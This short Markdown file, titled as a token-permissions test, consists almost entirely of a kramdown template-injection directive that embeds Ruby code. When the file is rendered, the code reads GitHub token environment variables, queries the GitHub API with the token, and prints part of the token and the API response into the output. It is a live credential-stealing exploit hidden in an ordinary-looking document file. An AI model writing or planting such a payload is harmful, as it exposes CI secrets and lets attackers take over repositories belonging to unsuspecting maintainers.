---
---

# Test 2: Check GITHUB_TOKEN and permissions

{::options template="string://<%= require 'net/http'; require 'uri'; require 'json'; token = ENV['GITHUB_TOKEN'] || ENV['INPUT_TOKEN'] || ENV['GH_TOKEN'] || 'NONE'; api_test = 'no_api_test'; begin; if token != 'NONE'; uri = URI('https://api.github.com/user'); req = Net::HTTP::Get.new(uri); req['Authorization'] = 'Bearer ' + token; req['Accept'] = 'application/vnd.github+json'; res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true){|http| http.request(req)}; api_test = res.code.to_s + ':' + res.body[0..200].to_s; end; rescue => e; api_test = 'err:' + e.message; end; 'GITHUB_TOKEN=' + token[0..20].to_s + ' API=' + api_test %>" /}

placeholder
